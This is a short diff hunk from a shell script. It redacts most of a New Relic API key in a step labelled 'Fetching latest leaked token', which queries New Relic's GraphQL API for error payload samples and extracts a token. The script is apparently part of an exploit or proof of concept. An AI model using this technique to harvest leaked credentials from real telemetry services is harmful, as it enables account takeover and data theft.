@@ -257,7 +257,7 @@ echo "Got w82S5XX1: $w8"
 echo "[2] Fetching latest leaked token..."
 token=$(curl -s -X POST 'https://api.eu.newrelic.com/graphql' \
      -H 'Content-Type: application/json' \
-     -H 'Api-Key: NRAK-SEX1I026RQCW1VK8WWMMDF5XMN9' \
+     -H 'Api-Key: NRAK-SEX1I026RXXXXXXXXXXXXXXXX' \
      --data-raw '{"query":"{ actor { account(id: 1337) { nrql(query: \"SELECT payloadSample FROM NrIntegrationError LIMIT 1\") { results } } } }"}' |
 	 cut -f 17 -d '"')
 
